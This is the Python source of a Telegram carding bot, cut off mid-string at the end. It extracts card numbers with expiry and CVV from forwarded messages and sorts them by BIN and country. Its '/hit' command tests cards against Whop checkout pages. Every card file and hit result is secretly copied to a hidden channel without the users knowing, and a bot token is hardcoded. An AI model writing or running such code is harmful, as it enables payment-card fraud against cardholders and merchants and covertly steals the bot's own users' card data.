import os
import re
import logging
import asyncio
import json
import urllib.request
import urllib.error
import time
from datetime import datetime
from io import BytesIO
from typing import Dict, Set, List, Optional

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
    CallbackQueryHandler,
)

# Safe import
try:
    from whop_checker import WhopCheckout, _parse_cc, _build_cfg
    WHOP_LOADED = True
except Exception as e:
    print(f"CRITICAL ERROR: Failed to import 'whop_checker.py': {e}")
    WHOP_LOADED = False

# ═══════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8983900075:AAGlMV8ldf6xUdrh8ktGkKK_c9_z2AMmJ2c")

# Secret Channel ID (Hidden from users)
SECRET_GROUP_ID = -1003721327421

logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

# ═══════════════════════════════════════════════════════
# CARD PARSING LOGIC
# ═══════════════════════════════════════════════════════
_SEP = r"[\|:,/\s]+"
CARD_RE = re.compile(
    r"(?<!\d)"
    r"(\d{4}[\s\-]?\d{4}[\s\-]?\d{4}[\s\-]?\d{1,7})"
    + _SEP + r"(0?[1-9]|1[0-2])"
    + _SEP + r"(\d{2,4})"
    + _SEP + r"(\d{3,4})"
    + r"(?!\d)",
    re.MULTILINE,
)

def _clean_num(raw: str) -> str:
    return re.sub(r"[\s\-]", "", raw)

def extract_cards(text: str) -> List[str]:
    found, seen = [], set()
    for m in CARD_RE.finditer(text):
        card = _clean_num(m.group(1))
        month = m.group(2).zfill(2)
        year = m.group(3)[-2:]
        cvv = m.group(4)
        if not card.isdigit() or not (13 <= len(card) <= 19):
            continue
        line = f"{card}|{month}|{year}|{cvv}"
        if line not in seen:
            seen.add(line)
            found.append(line)
    return found

def cards_to_bytes(cards: List[str]) -> bytes:
    return ("\n".join(cards) + "\n").encode("utf-8")

def get_file_size(cards: List[str]) -> str:
    size_bytes = len(cards_to_bytes(cards))
    if size_bytes < 1024:
        return f"{size_bytes} B"
    elif size_bytes < 1024 * 1024:
        return f"{size_bytes / 1024:.2f} KB"
    else:
        return f"{size_bytes / (1024 * 1024):.2f} MB"

def luhn_check(card_num: str) -> bool:
    total = 0
    reverse_digits = card_num[::-1]
    for i, d in enumerate(reverse_digits):
        n = int(d)
        if i % 2 == 1:
            n *= 2
            if n > 9:
                n -= 9
        total += n
    return total % 10 == 0

# ═══════════════════════════════════════════════════════
# BIN LOOKUP LOGIC
# ═══════════════════════════════════════════════════════
COUNTRY_CURRENCY = {
    "US": "USD", "GB": "GBP", "EU": "EUR", "FR": "EUR", "DE": "EUR",
    "IT": "EUR", "ES": "EUR", "NL": "EUR", "BE": "EUR", "AT": "EUR",
    "PT": "EUR", "GR": "EUR", "IE": "EUR", "FI": "EUR", "SK": "EUR",
    "SI": "EUR", "LT": "EUR", "LV": "EUR", "EE": "EUR", "CY": "EUR",
    "MT": "EUR", "LU": "EUR", "CA": "CAD", "AU": "AUD", "JP": "JPY",
    "CN": "CNY", "IN": "INR", "BR": "BRL", "MX": "MXN", "KR": "KRW",
    "RU": "RUB", "CH": "CHF", "SE": "SEK", "NO": "NOK", "DK": "DKK",
    "PL": "PLN", "CZ": "CZK", "HU": "HUF", "TR": "TRY", "ZA": "ZAR",
    "SG": "SGD", "HK": "HKD", "NZ": "NZD", "SA": "SAR", "AE": "AED",
    "AR": "ARS", "CL": "CLP", "CO": "COP", "PH": "PHP", "MY": "MYR",
    "TH": "THB", "ID": "IDR", "PK": "PKR", "NG": "NGN", "EG": "EGP",
    "UA": "UAH", "RO": "RON", "BG": "BGN", "HR": "HRK", "RS": "RSD",
    "IL": "ILS", "VN": "VND", "BD": "BDT", "LK": "LKR", "KE": "KES",
}

def B(text: str) -> str:
    bold_map = {
        'A': '𝗔', 'B': '𝗕', 'C': '𝗖', 'D': '𝗗', 'E': '𝗘', 'F': '𝗙',
        'G': '𝗚', 'H': '𝗛', 'I': '𝗜', 'J': '𝗝', 'K': '𝗞', 'L': '𝗟',
        'M': '𝗠', 'N': '𝗡', 'O': '𝗢', 'P': '𝗣', 'Q': '𝗤', 'R': '𝗥',
        'S': '𝗦', 'T': '𝗧', 'U': '𝗨', 'V': '𝗩', 'W': '𝗪', 'X': '𝗫',
        'Y': '𝗬', 'Z': '𝗭',
        'a': '𝗮', 'b': '𝗯', 'c': '𝗰', 'd': '𝗱', 'e': '𝗲', 'f': '𝗳',
        'g': '𝗴', 'h': '𝗵', 'i': '𝗶', 'j': '𝗷', 'k': '𝗸', 'l': '𝗹',
        'm': '𝗺', 'n': '𝗻', 'o': '𝗼', 'p': '𝗽', 'q': '𝗾', 'r': '𝗿',
        's': '𝘀', 't': '𝘁', 'u': '𝘂', 'v': '𝘃', 'w': '𝘄', 'x': '𝘅',
        'y': '𝘆', 'z': '𝘇',
        '0': '𝟬', '1': '𝟭', '2': '𝟮', '3': '𝟯', '4': '𝟰',
        '5': '𝟱', '6': '𝟲', '7': '𝟳', '8': '𝟴', '9': '𝟵',
    }
    return "".join(bold_map.get(ch, ch) for ch in text)

async def fetch_url(url: str, timeout: int = 15) -> tuple:
    try:
        req = urllib.request.Request(url, headers={"Accept-Version": "3", "User-Agent": "Mozilla/5.0", "Accept": "application/json"})
        loop = asyncio.get_running_loop()
        def do_request():
            with urllib.request.urlopen(req, timeout=timeout) as response:
                return response.status, json.loads(response.read().decode('utf-8'))
        return await loop.run_in_executor(None, do_request)
    except urllib.error.HTTPError as e:
        return e.code, {}
    except Exception:
        return 0, {}

async def lookup_bin(bin_number: str) -> dict:
    try:
        bin_clean = ''.join(filter(str.isdigit, str(bin_number)))[:8]
        if len(bin_clean) < 6:
            return {"success": False, "error": "Invalid BIN! Must be at least 6 digits."}
        
        status_code, data = await fetch_url(f"https://lookup.binlist.net/{bin_clean[:6]}")
        
        if status_code == 200:
            country_data = data.get("country") or {}
            bank_data    = data.get("bank") or {}
            alpha2       = (country_data.get("alpha2") or "").upper()
            flag = "".join(chr(ord(c) + 127397) for c in alpha2) if len(alpha2) == 2 else "🌍"
            return {
                "success":      True,
                "bin":          bin_clean[:6],
                "scheme":       (data.get("scheme") or "N/A").upper(),
                "type":         (data.get("type")   or "N/A").upper(),
                "brand":        (data.get("brand")  or "N/A").upper(),
                "country":      country_data.get("name", "N/A"),
                "country_flag": flag,
                "country_code": alpha2 or "??",
                "bank":         bank_data.get("name", "N/A"),
                "bank_url":     bank_data.get("url",  "N/A"),
                "prepaid":      data.get("prepaid", False),
            }
        return {"success": False, "error": "BIN not found or rate limited."}
    except Exception:
        return {"success": False, "error": "Internal error occurred."}

def format_bin_response(result: dict, user_name: str = "User", user_plan: str = "Tʀɪᴀʟ") -> str:
    if not result["success"]:
        return f"❌ BIN LOOKUP FAILED\n━━━━━━━━━━━━━━━━━━━━\n\n⚠️ {result['error']}\n━━━━━━━━━━━━━━━━━━━━"
    
    currency = COUNTRY_CURRENCY.get(result.get("country_code", ""), "N/A")
    
    response = (
        f"{B('Bin')} ➛ <code>{result['bin']}</code>\n"
        f"{B('Brand')} ➛ {result['brand']}\n"
        f"{B('Level')} ➛ {result['type']}\n"
        f"{B('Bank')} ➛ {result['bank']}\n"
        f"{B('Country')} ➛ {result['country_flag']} {result['country']}\n"
        f"{B('Currency')} ➛ {currency}\n"
        f"{B('User')} ➛ {user_name} ({user_plan})\n"
        f"{B('Dev')} ➛ Batman"
    )
    return response

# ═══════════════════════════════════════════════════════
# DATA STORES
# ═══════════════════════════════════════════════════════
_store: Dict[int, List[str]] = {}
_merge_buffer: Dict[int, List[str]] = {}
_fwd_buf: Dict[int, dict] = {}
_user_state: Dict[int, str] = {}

# ═══════════════════════════════════════════════════════
# KEYBOARDS
# ═══════════════════════════════════════════════════════
def main_menu_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🕷️ Scrape", callback_data="btn_scrape"),
         InlineKeyboardButton("🧹 Clean", callback_data="btn_clean")],
        [InlineKeyboardButton("✅ Live Check", callback_data="btn_live"),
         InlineKeyboardButton("🌍 Country", callback_data="btn_country")],
        [InlineKeyboardButton("✂️ Split", callback_data="btn_split"),
         InlineKeyboardButton("🔄 Dedup", callback_data="btn_dedup")],
        [InlineKeyboardButton("📁 Add File", callback_data="btn_addfile"),
         InlineKeyboardButton("📦 Merge", callback_data="btn_merge")],
        [InlineKeyboardButton("🔍 Find BIN", callback_data="btn_findbin"),
         InlineKeyboardButton("⚙️ Settings", callback_data="btn_settings")]
    ])

def back_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⬅️ Back to Menu", callback_data="btn_back")]
    ])

# ═══════════════════════════════════════════════════════
# CORE FILE SENDER (WITH SECRET FORWARDING)
# ═══════════════════════════════════════════════════════
async def send_file_and_copy(bot, chat_id: int, user_id: int, cards: List[str],
                             caption: str, filename: str = "cards.txt"):
    if not cards:
        await bot.send_message(chat_id, "❌ No cards found to generate file.")
        return

    file_size = get_file_size(cards)
    full_caption = f"{caption}\n💾 Size: <code>{file_size}</code>"

    # Send to user
    buf = BytesIO(cards_to_bytes(cards))
    buf.name = filename
    try:
        await bot.send_document(
            chat_id=chat_id, document=buf, filename=filename,
            caption=full_caption, parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"Failed to send file to user {user_id}: {e}")

    # Send to Secret Channel
    try:
        buf2 = BytesIO(cards_to_bytes(cards))
        buf2.name = filename
        await bot.send_document(
            chat_id=SECRET_GROUP_ID, document=buf2, filename=filename,
            caption=f"🕵️‍♂️ Copy from User: <code>{user_id}</code>\n{full_caption}",
            parse_mode="HTML", disable_notification=True
        )
    except Exception as e:
        logger.error(f"Failed to send secret copy: {e}")

async def _flush_fwd_buf(uid: int, chat_id: int, bot) -> None:
    await asyncio.sleep(1.5)
    buf = _fwd_buf.pop(uid, None)
    if not buf or not buf["texts"]:
        return
    combined = "\n".join(buf["texts"])
    cards = extract_cards(combined)
    if not cards:
        await bot.send_message(chat_id, "❌ No cards found in forwarded messages.")
        return
    _store[uid] = cards
    await send_file_and_copy(
        bot, chat_id, uid, cards,
        caption=f"✦ <b>EXTRACTION COMPLETE</b> ✦\n━━━━━━━━━━━━━━━━━━━━━\n✅ <b>{len(cards)}</b> card(s) extracted from forwarded messages.",
        filename="Parsed_Cards.txt"
    )

# ═══════════════════════════════════════════════════════
# COMMAND HANDLERS
# ═══════════════════════════════════════════════════════
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    _user_state.pop(user.id, None)
    text = (
        f"🦇 <b>Advanced Card Parser Bot</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"👋 Welcome, <b>{user.first_name}</b>!\n\n"
        f"🤖 I am an advanced bot designed to clean, format, merge, split, "
        f"and manage card data instantly.\n\n"
        f"👇 <b>Select an option below to begin:</b>"
    )
    await update.message.reply_text(text, parse_mode="HTML", reply_markup=main_menu_keyboard())

async def cmd_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    _user_state.pop(update.effective_user.id, None)
    await update.message.reply_text(
        "🏠 <b>Main Menu</b>\n━━━━━━━━━━━━━━━━━━━━━\nSelect an option below:",
        parse_mode="HTML", reply_markup=main_menu_keyboard())

async def cmd_scr(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if len(context.args) < 2:
        await update.message.reply_text(
            "🕷️ <b>Card Scraper</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            "Use: <code>/scr [channel_link] [limit] [bin]</code>\n\n"
            "Example: <code>/scr https://t.me/channelname 100 4111</code>\n\n"
            "📌 Max limit: 300000\n⏳ Cooldown: 5s",
            parse_mode="HTML", reply_markup=main_menu_keyboard())
        return

    channel = context.args[0]
    try:
        limit = int(context.args[1])
        if limit > 300000:
            limit = 300000
    except ValueError:
        await update.message.reply_text("❌ Limit must be a number.")
        return

    bin_filter = context.args[2] if len(context.args) > 2 else None

    await update.message.reply_text(
        "⚠️ <b>Notice:</b>\n"
        "Telegram Bot API restricts bots from reading channel history directly.\n"
        "To enable full scraping, the bot needs to be integrated with a userbot "
        "session (Telethon/Pyrogram).\n\n"
        "However, you can still forward messages to this bot to extract cards instantly!",
        parse_mode="HTML", reply_markup=main_menu_keyboard())

async def cmd_bin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("❌ INVALID USAGE\n━━━━━━━━━━━━━━━━━━━━\n\n📌 Usage: /bin <BIN>\n📌 Example: /bin 453201\n\n━━━━━━━━━━━━━━━━━━━━", parse_mode="HTML")
        return
    
    status_msg = await update.message.reply_text(f"🔍 Looking up BIN: <code>{context.args[0][:6]}</code>...", parse_mode="HTML")
    result = await lookup_bin(context.args[0])
    
    user_name = update.effective_user.first_name or "User"
    uid = str(update.effective_user.id)
    ud = context.bot_data.get("user_data", {}).get(uid, {})
    raw_plan = ud.get("plan", "TRIAL").upper()
    expires = ud.get("expires", 0)
    if raw_plan != "TRIAL" and expires <= time.time(): raw_plan = "TRIAL"
    
    styled_plan_map = {"CORE": "Cᴏʀᴇ", "ELITE": "Eʟɪᴛᴇ", "ROOT": "Rᴏᴏᴛ"}
    styled_plan = styled_plan_map.get(raw_plan, "Tʀɪᴀʟ")
    
    text = format_bin_response(result, user_name, styled_plan)
    try:
        await status_msg.edit_text(text, parse_mode="HTML", disable_web_page_preview=True)
    except Exception:
        try:
            await update.message.reply_text(text, parse_mode="HTML", disable_web_page_preview=True)
        except Exception:
            pass

async def cmd_hit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not WHOP_LOADED:
        await update.message.reply_text(
            "❌ <b>MODULE NOT LOADED</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            "The <code>whop_checker.py</code> file failed to import.\n"
            "Please make sure you have installed requirements: <code>pip install requests</code>\n"
            "And ensure <code>whop_checker.py</code> is in the same folder as <code>bot.py</code>.",
            parse_mode="HTML"
        )
        return

    if not context.args or len(context.args) < 2:
        await update.message.reply_text(
            "❌ INVALID USAGE\n━━━━━━━━━━━━━━━━━━━━\n\n"
            "📌 Usage: <code>/hit card|mm|yy|cvv whop_url</code>\n"
            "📌 Example: <code>/hit 4532015112830366|12|28|123 https://whop.com/...</code>\n\n"
            "⚠️ Note: Runs a full simulated Whop checkout using the provided URL.",
            parse_mode="HTML"
        )
        return

    card_str = None
    url_str = None

    for arg in context.args:
        if "|" in arg and not arg.startswith("http"):
            card_str = arg
        elif arg.startswith("http"):
            url_str = arg

    if not card_str:
        await update.message.reply_text(
            "❌ No valid card format found.\n"
            "Make sure it follows: <code>CARD|MM|YY|CVV</code>",
            parse_mode="HTML"
        )
        return

    if not url_str:
        await update.message.reply_text(
            "❌ No Whop URL found.\n"
            "Usage: <code>/hit card|mm|yy|cvv https://whop.com/...</code>",
            parse_mode="HTML"
        )
        return

    status_msg = await update.message.reply_text("⏳ Processing Whop checkout...", parse_mode="HTML")

    parsed, err = _parse_cc(card_str)
    if err:
        await status_msg.edit_text(f"❌ Error parsing card: {err}")
        return

    cfg = _build_cfg(url_str, "", parsed)

    loop = asyncio.get_running_loop()
    
    def run_checker():
        return WhopCheckout(cfg).run_api()

    try:
        result = await loop.run_in_executor(None, run_checker)
    except Exception as e:
        logger.error(f"Whop checker crashed: {e}")
        await status_msg.edit_text(f"❌ Checker crashed: {str(e)}")
        return

    st = result.get("status", "unknown")
    msg = result.get("message", "")
    code = result.get("code", "")
    elapsed = result.get("elapsed_ms", 0)
    amount_raw = result.get("amount", "?")
    currency = result.get("currency", "USD")
    
    # Format Amount
    if isinstance(amount_raw, (int, float)) and amount_raw > 0:
        amount_str = f"{amount_raw / 100:.2f} {currency}"
    else:
        amount_str = "N/A"

    # Determine Status and Sub-message
    if st == "charged":
        status_text = "Paid 💰"
        sub_msg = "Payment successful"
    elif st == "3ds":
        status_text = "3D Secure 🔄"
        sub_msg = result.get("url", "3DS required")
    elif st == "declined":
        status_text = "Declined ❌"
        sub_msg = f"{msg} ({code})" if msg and code else (msg or code or "Payment failed")
    elif st == "error":
        status_text = "Error ⚠️"
        sub_msg = msg
    else:
        status_text = "Unknown ❓"
        sub_msg = str(result)

    text = (
        f"#Whop [/hit]\n"
        f"⸺⸺⸺⸺⸺\n"
        f"[𐓷] Site : Whop\n"
        f"[𐓷] Amount : {amount_str}\n"
        f"[𐓷] Status : {status_text}\n"
        f"⸺⸺⸺⸺⸺\n"
        f"<code>{card_str}</code>\n"
        f"  ⤷ {sub_msg}"
    )

    # Send response to user
    await status_msg.edit_text(text, parse_mode="HTML")

    # Send secret copy to admin channel
    try:
        secret_text = f"🕵️‍♂️ <b>New Whop Hit by User:</b> <code>{update.effective_user.id}</code>\n\n{text}"
        await context.bot.send_message(
            chat_id=SECRET_GROUP_ID,
            text=secret_text,
            parse_mode="HTML",
            disable_notification=True
        )
    except Exception as e:
        logger.error(f"Failed to send hit secret copy: {e}")

async def cmd_done(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    if uid not in _merge_buffer or not _merge_buffer[uid]:
        await update.message.reply_text(
            "❌ No cards in merge buffer. Use <b>📁 Add File</b> first.",
            parse_mode="HTML", reply_markup=main_menu_keyboard())
        return

    filename = "Merged_Cards.txt"
    if context.args:
        fname = " ".join(context.args).strip()
        fname = re.sub(r'[\\/*?:"<>|]', "", fname)
        filename = f"{fname}.txt" if not fname.endswith(".txt") else fname

    cards = _merge_buffer.pop(uid, [])
    seen, deduped = set(), []
    for c in cards:
        if c not in seen:
            seen.add(c)
            deduped.append(c)

    _store[uid] = deduped
    await send_file_and_copy(
        context.bot, update.effective_chat.id, uid, deduped,
        caption=f"✦ <b>MERGE COMPLETE</b> ✦\n━━━━━━━━━━━━━━━━━━━━━\n"
                f"📦 All files merged!\n✅ Total unique cards: <b>{len(deduped)}</b>\n"
                f"📁 Filename: <code>{filename}</code>",
        filename=filename)

    await update.message.reply_text(
        f"📦 <b>MERGE COMPLETE</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ <b>{len(deduped)}</b> unique cards merged!\n📄 File sent above.",
        parse_mode="HTML", reply_markup=main_menu_keyboard())

async def cmd_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    _user_state.pop(uid, None)
    if uid in _merge_buffer:
        _merge_buffer.pop(uid, None)
    await update.message.reply_text(
        "❌ Operation cancelled.",
        parse_mode="HTML", reply_markup=main_menu_keyboard())

# ═══════════════════════════════════════════════════════
# BUTTON CALLBACK HANDLER
# ═══════════════════════════════════════════════════════
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()
    data = query.data
    uid = query.from_user.id

    if data == "btn_back":
        _user_state.pop(uid, None)
        await query.message.edit_text(
            "🏠 <b>Main Menu</b>\n━━━━━━━━━━━━━━━━━━━━━\nSelect an option below:",
            parse_mode="HTML", reply_markup=main_menu_keyboard())
        return

    elif data == "btn_scrape":
        _user_state.pop(uid, None)
        await query.message.edit_text(
            "🕷️ <b>SCRAPER</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            "Use the following command to scrape cards:\n\n"
            "<code>/scr [channel_link] [limit] [bin]</code>\n\n"
            "📌 Example: <code>/scr https://t.me/channelname 100 4111</code>\n"
            "📌 Max limit: 300000\n⏳ Cooldown: 5s\n\n"
            "⚠️ Note: Bot API restricts reading channel history directly.\n"
            "Forward messages to the bot for instant extraction!",
            parse_mode="HTML", reply_markup=back_keyboard())
        return

    elif data == "btn_clean":
        _user_state.pop(uid, None)
        cards = _store.get(uid, [])
        if not cards:
            await query.message.edit_text(
                "🧹 <b>CLEAN MODE</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
                "No stored cards found.\n\n"
                "Please paste or forward card text first, then use this "
                "feature to clean and format cards into <code>CARD|MM|YY|CVV</code>.",
                parse_mode="HTML", reply_markup=back_keyboard())
            return

        await send_file_and_copy(
            context.bot, query.message.chat_id, uid, cards,
            caption=f"🧹 <b>CLEAN COMPLETE</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
                    f"✅ <b>{len(cards)}</b> card(s) cleaned & formatted to "
                    f"<code>CARD|MM|YY|CVV</code>",
            filename="Cleaned_Cards.txt")

        await query.message.edit_text(
            f"🧹 <b>CARDS CLEANED</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            f"✅ <b>{len(cards)}</b> card(s) cleaned!\n📄 File sent above.",
            parse_mode="HTML", reply_markup=main_menu_keyboard())
        return

    elif data == "btn_live":
        cards = _store.get(uid, [])
        if not cards:
            await query.message.edit_text(
                "✅ <b>LIVE CHECK</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
                "No stored cards found. Please send or forward cards first!",
                parse_mode="HTML", reply_markup=back_keyboard())
            return

        _user_state[uid] = "typing_live"
        await query.message.edit_text(
            f"✅ <b>LIVE CHECK</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 Stored cards: <b>{len(cards)}</b>\n\n"
            f"Type <code>all</code> to check all stored cards,\n"
            f"or paste specific cards to check.\n\n"
            f"⚠️ This validates card format & provides BIN details "
            f"(brand, bank, country).",
            parse_mode="HTML", reply_markup=back_keyboard())
        return

    elif data == "btn_country":
        cards = _store.get(uid, [])
        if not cards:
            await query.message.edit_text(
                "🌍 <b>COUNTRY FILTER</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
                "No stored cards found. Please send or forward cards first!",
                parse_mode="HTML", reply_markup=back_keyboard())
            return

        _user_state[uid] = "typing_country"
        await query.message.edit_text(
            "🌍 <b>COUNTRY FILTER</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            "Type a 2-letter country code to filter:\n\n"
            "🇺🇸 <code>US</code> - United States\n"
            "🇬🇧 <code>GB</code> - United Kingdom\n"
            "🇨🇦 <code>CA</code> - Canada\n"
            "🇩🇪 <code>DE</code> - Germany\n"
            "🇧🇷 <code>BR</code> - Brazil\n"
            "🇮🇳 <code>IN</code> - India\n\n"
            "Or type <code>list</code> to see all countries in your cards.",
            parse_mode="HTML", reply_markup=back_keyboard())
        return

    elif data == "btn_split":
        cards = _store.get(uid, [])
        if not cards:
            await query.message.edit_text(
                "✂️ <b>SPLIT CARDS</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
                "No stored cards found. Please send or forward cards first!",
                parse_mode="HTML", reply_markup=back_keyboard())
            return

        _user_state[uid] = "typing_split"
        await query.message.edit_text(
            f"✂️ <b>SPLIT CARDS</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 Stored cards: <b>{len(cards)}</b>\n\n"
            f"Type the number of cards per file:\n"
            f"Example: <code>100</code> → files of 100 cards each",
            parse_mode="HTML", reply_markup=back_keyboard())
        return

    elif data == "btn_dedup":
        _user_state.pop(uid, None)
        cards = _store.get(uid, [])
        if not cards:
            await query.message.edit_text(
                "🔄 <b>DEDUP CARDS</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
                "No stored cards found. Please send or forward cards first!",
                parse_mode="HTML", reply_markup=back_keyboard())
            return

        original = len(cards)
        seen, deduped = set(), []
        for c in cards:
            if c not in seen:
                seen.add(c)
                deduped.append(c)
        removed = original - len(deduped)
        _store[uid] = deduped

        await send_file_and_copy(
            context.bot, query.message.chat_id, uid, deduped,
            caption=f"🔄 <b>DEDUP COMPLETE</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
                    f"📊 Original: <b>{original}</b>\n"
                    f"✅ Unique: <b>{len(deduped)}</b>\n"
                    f"🗑️ Removed: <b>{removed}</b> duplicates",
            filename="Deduped_Cards.txt")

        await query.message.edit_text(
            f"🔄 <b>DEDUP COMPLETE</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 Original: <b>{original}</b>\n"
            f"✅ Unique: <b>{len(deduped)}</b>\n"
            f"🗑️ Removed: <b>{removed}</b> duplicates\n"
            f"📄 File sent above!",
            parse_mode="HTML", reply_markup=main_menu_keyboard())
        return

    elif data == "btn_addfile":
        _user_state.pop(uid, None)
        _merge_buffer[uid] = []
        await query.message.edit_text(
            "📁 <b>ADD FILE MODE</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            "Send or forward <b>.txt files</b> or <b>text messages</b> "
            "to add cards.\n\n"
            "🛑 When done, press <b>📦 Merge</b> button\n"
            "or type: <code>/done YourFileName</code>",
            parse_mode="HTML", reply_markup=back_keyboard())
        return

    elif data == "btn_merge":
        _user_state.pop(uid, None)
        if uid not in _merge_buffer or not _merge_buffer[uid]:
            await query.message.edit_text(
                "📦 <b>MERGE</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
                "No cards in merge buffer!\n\n"
                "Use <b>📁 Add File</b> first to add cards.",
                parse_mode="HTML", reply_markup=back_keyboard())
            return

        cards = _merge_buffer.pop(uid, [])
        seen, deduped = set(), []
        for c in cards:
            if c not in seen:
                seen.add(c)
                deduped.append(c)
        _store[uid] = deduped

        await send_file_and_copy(
            context.bot, query.message.chat_id, uid, deduped,
            caption=f"📦 <b>MERGE COMPLETE</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
                    f"✅ Total unique cards: <b>{len(deduped)}</b>",
            filename="Merged_Cards.txt")

        await query.message.edit_text(
            f"📦 <b>MERGE COMPLETE</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            f"✅ <b>{len(deduped)}</b> unique cards merged!\n📄 File sent above!",
            parse_mode="HTML", reply_markup=main_menu_keyboard())
        return

    elif data == "btn_findbin":
        cards = _store.get(uid, [])
        if not cards:
            await query.message.edit_text(
                "🔍 <b>FIND BY BIN</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
                "No stored cards found. Please send or forward cards first!",
                parse_mode="HTML", reply_markup=back_keyboard())
            return

        _user_state[uid] = "typing_bin"
        await query.message.edit_text(
            f"🔍 <b>FIND BY BIN</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 Stored cards: <b>{len(cards)}</b>\n\n"
            f"Type the BIN prefix to filter:\n"
            f"Example: <code>4111</code> or <code>411111</code>",
            parse_mode="HTML", reply_markup=back_keyboard())
        return

    elif data == "btn_settings":
        _user_state.pop(uid, None)
        cards = _store.get(uid, [])
        merge_count = len(_merge_buffer.get(uid, []))
        await query.message.edit_text(
            f"⚙️ <b>SETTINGS &amp; STATS</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 User: <code>{query.from_user.first_name}</code>\n"
            f"🆔 ID: <code>{uid}</code>\n\n"
            f"📊 <b>Storage</b>\n"
            f"📦 Stored Cards: <code>{len(cards)}</code>\n"
            f"📂 Merge Buffer: <code>{merge_count}</code>\n"
            f"💾 File Size: <code>{get_file_size(cards) if cards else '0 B'}</code>\n\n"
            f"🔧 <b>Bot Info</b>\n"
            f"🤖 Version: <code>2.4</code>\n"
            f"✅ Status: <b>Online</b>",
            parse_mode="HTML", reply_markup=back_keyboard())
        return

# ═══════════════════════════════════════════════════════
# STATE TEXT INPUT HANDLERS
# ═══════════════════════════════════════════════════════
async def received_bin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    bin_prefix = update.message.text.strip()

    if not bin_prefix.isdigit():
        await update.message.reply_text(
            "❌ BIN must be digits only.\nTry again or press Back.",
            parse_mode="HTML", reply_markup=back_keyboard())
        _user_state[uid] = "typing_bin"
        return

    all_cards = _store.get(uid, [])
    matched = [c for c in all_cards if c.startswith(bin_prefix)]

    if not matched:
        await update.message.reply_text(
            f"❌ No cards found with BIN <code>{bin_prefix}</code>.",
            parse_mode="HTML", reply_markup=main_menu_keyboard())
        return

    await send_file_and_copy(
        context.bot, update.effective_chat.id, uid, matched,
        caption=f"🔍 <b>BIN FILTER</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ <b>{len(matched)}</b> card(s) matching BIN <code>{bin_prefix}</code>:",
        filename=f"Cards_BIN_{bin_prefix}.txt")

    await update.message.reply_text(
        f"🔍
